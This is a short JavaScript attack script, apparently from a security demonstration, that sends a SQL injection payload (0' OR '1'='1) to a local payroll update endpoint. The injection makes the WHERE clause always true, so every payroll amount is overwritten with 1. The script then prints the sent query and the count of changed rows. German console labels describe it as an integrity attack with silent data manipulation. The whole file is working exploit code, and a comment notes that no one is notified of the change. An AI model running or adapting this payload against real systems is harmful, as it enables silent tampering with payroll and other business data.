const BASE = 'http://localhost:3000';

async function main() {
    // 0' OR '1'='1  breaks out of the quotes so the where is always true,
    // payrolls are updated and noone is notified
    const body = { id: "0' OR '1'='1", payroll_amount: "1" };

    const res = await fetch(`${BASE}/payroll/update`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });
    const data = await res.json();

    console.log('--- Angriff: Integrität (stille Datenmanipulation) ---');
    console.log('Gesendete Query:', data.sql);
    console.log('Veränderte Zeilen:', data.affectedRows);
}

main();